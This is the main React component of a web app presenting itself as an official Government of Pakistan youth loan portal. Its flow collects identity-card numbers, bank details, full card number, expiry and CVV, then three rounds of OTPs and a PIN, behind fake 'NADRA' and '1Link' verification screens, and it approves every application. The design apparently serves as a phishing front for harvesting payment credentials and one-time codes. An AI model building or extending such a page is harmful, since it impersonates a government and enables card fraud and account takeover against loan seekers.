import React, { useState, useEffect } from 'react';
import { Language, AppStep, PersonalInfo, LoanDetails, PaymentDetails, LoanApplication } from './types';
import { Navbar } from './components/Navbar';
import { HeroHome } from './components/HeroHome';
import { CalculatorModal } from './components/CalculatorModal';
import { MyApplicationsModal } from './components/MyApplicationsModal';
import { Step1Personal } from './components/steps/Step1Personal';
import { StepNadraLoading } from './components/steps/StepNadraLoading';
import { Step3LoanDetails } from './components/steps/Step3LoanDetails';
import { StepEligibilityLoading } from './components/steps/StepEligibilityLoading';
import { Step5Payment } from './components/steps/Step5Payment';
import { Step1LinkLoading } from './components/steps/Step1LinkLoading';
import { Step7Otp } from './components/steps/Step7Otp';
import { Step8Pin } from './components/steps/Step8Pin';
import { StepStatusResult } from './components/steps/StepStatusResult';

export default function App() {
  const [language, setLanguage] = useState<Language>('en');
  const [step, setStep] = useState<AppStep>('home');
  const [otpStep, setOtpStep] = useState<number>(1);

  const [showCalculator, setShowCalculator] = useState<boolean>(false);
  const [showMyApps, setShowMyApps] = useState<boolean>(false);

  // Form states
  const [personal, setPersonal] = useState<PersonalInfo>({
    fullName: '',
    cnic: '',
    mobile: '',
    gender: '',
    dob: '',
    province: '',
    address: '',
  });

  const [loan, setLoan] = useState<LoanDetails>({
    amount: 1000000,
    purpose: '',
    occupation: '',
    bankName: '',
    accountNumber: '',
    currentBalance: 0,
    monthlyIncome: 0,
    salaryDate: '',
  });

  const [payment, setPayment] = useState<PaymentDetails>({
    cardNumber: '',
    expiry: '',
    cvv: '',
  });

  const [applications, setApplications] = useState<LoanApplication[]>(() => {
    const saved = localStorage.getItem('pk_youth_loan_apps');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return [];
      }
    }
    return [
      {
        id: 'PLP-2026-209158',
        date: '21 Sep 2026',
        personal: {
          fullName: 'Mr Nasir',
          cnic: '67777-7677666-7',
          mobile: '03001234567',
          gender: 'Male',
          dob: '1995-05-12',
          province: 'Punjab',
          address: 'House 42, Lahore',
        },
        loan: {
          amount: 83737,
          purpose: 'Small Business Startup',
          occupation: 'Business Owner',
          bankName: 'Raast Instant Transfer',
          accountNumber: '0123456789',
          currentBalance: 15000,
          monthlyIncome: 65000,
          salaryDate: '1st of every month',
        },
        payment: { cardNumber: '0000 0000 0000 3289', expiry: '12/28', cvv: '123' },
        status: 'Rejected',
        otpStep: 1,
      },
    ];
  });

  useEffect(() => {
    localStorage.setItem('pk_youth_loan_apps', JSON.stringify(applications));
  }, [applications]);

  const handleStartApply = (presetAmount?: number) => {
    if (presetAmount) {
      setLoan((prev) => ({ ...prev, amount: presetAmount }));
    }
    setStep('personal');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePersonalComplete = (data: PersonalInfo) => {
    setPersonal(data);
    setStep('nadra_loading');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleNadraComplete = () => {
    setStep('loan_details');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleLoanComplete = (data: LoanDetails) => {
    setLoan(data);
    setStep('eligibility_loading');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleEligibilityComplete = () => {
    setStep('payment');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePaymentComplete = (data: PaymentDetails) => {
    setPayment(data);
    setStep('onelink_loading');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handle1LinkComplete = () => {
    setStep('otp');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleOtpComplete = () => {
    if (otpStep < 3) {
      setOtpStep((prev) => prev + 1);
      setStep('otp');
    } else {
      setStep('pin');
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePinComplete = () => {
    // Save new application
    const newApp: LoanApplication = {
      id: `PLP-2026-${Math.floor(100000 + Math.random() * 900000)}`,
      date: new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }),
      personal,
      loan,
      payment,
      status: 'Approved',
      otpStep: 3,
    };
    setApplications([newApp, ...applications]);
    setStep('result');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const currentApp: LoanApplication = applications[0] || {
    id: 'PLP-2026-209158',
    date: '21 Sep 2026',
    personal,
    loan,
    payment,
    status: 'Approved',
    otpStep: 1,
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col font-sans text-gray-900 selection:bg-emerald-200 selection:text-emerald-900">
      <Navbar
        language={language}
        setLanguage={setLanguage}
        onApplyClick={() => handleStartApply()}
        onProfileClick={() => setShowMyApps(true)}
        onHomeClick={() => setStep('home')}
      />

      <main className="flex-1 pb-16">
        {step === 'home' && (
          <HeroHome
            language={language}
            onApplyClick={() => handleStartApply()}
            onCalculatorClick={() => setShowCalculator(true)}
          />
        )}

        {step === 'personal' && (
          <Step1Personal
            language={language}
            initialData={personal}
            onNext={handlePersonalComplete}
            onBack={() => setStep('home')}
          />
        )}

        {step === 'nadra_loading' && (
          <StepNadraLoading
            language={language}
            onComplete={handleNadraComplete}
          />
        )}

        {step === 'loan_details' && (
          <Step3LoanDetails
            language={language}
            initialData={loan}
            onNext={handleLoanComplete}
            onBack={() => setStep('personal')}
          />
        )}

        {step === 'eligibility_loading' && (
          <StepEligibilityLoading
            language={language}
            onComplete={handleEligibilityComplete}
          />
        )}

        {step === 'payment' && (
          <Step5Payment
            language={language}
            applicantName={personal.fullName}
            initialData={payment}
            onNext={handlePaymentComplete}
            onBack={() => setStep('loan_details')}
          />
        )}

        {step === 'onelink_loading' && (
          <Step1LinkLoading
            language={language}
            onComplete={handle1LinkComplete}
          />
        )}

        {step === 'otp' && (
          <Step7Otp
            language={language}
            otpStep={otpStep}
            onNext={handleOtpComplete}
            onBack={() => setStep('payment')}
          />
        )}

        {step === 'pin' && (
          <Step8Pin
            language={language}
            onNext={handlePinComplete}
            onBack={() => setStep('otp')}
          />
        )}

        {step === 'result' && (
          <StepStatusResult
            language={language}
            application={currentApp}
            onRestart={() => {
              setStep('home');
              setOtpStep(1);
            }}
          />
        )}
      </main>

      {/* Footer */}
      <footer className="bg-[#05140e] text-emerald-100/70 text-xs py-6 px-4 text-center border-t border-emerald-900/40">
        <div className="max-w-4xl mx-auto space-y-2">
          <p className="font-semibold text-emerald-300">
            {language === 'en'
              ? 'Government of Pakistan • Ministry of Finance • Pakistan Youth Loan Portal'
              : 'حکومت پاکستان • وزارت خزانہ • پاکستان یوتھ لون پورٹل'}
          </p>
          <p className="text-[11px] text-emerald-100/50">
            Official portal for youth loan assistance programme. All 42 State Bank of Pakistan scheduled banks & digital wallets supported.
          </p>
        </div>
      </footer>

      {/* Modals */}
      {showCalculator && (
        <CalculatorModal
          language={language}
          onClose={() => setShowCalculator(false)}
          onStartApplyWithAmount={(amt) => {
            setShowCalculator(false);
            handleStartApply(amt);
          }}
        />
      )}

      {showMyApps && (
        <MyApplicationsModal
          language={language}
          applications={applications}
          onClose={() => setShowMyApps(false)}
          onSelectApplication={(app) => {
            setPersonal(app.personal);
            setLoan(app.loan);
            setPayment(app.payment);
            setStep('result');
          }}
        />
      )}
    </div>
  );
}
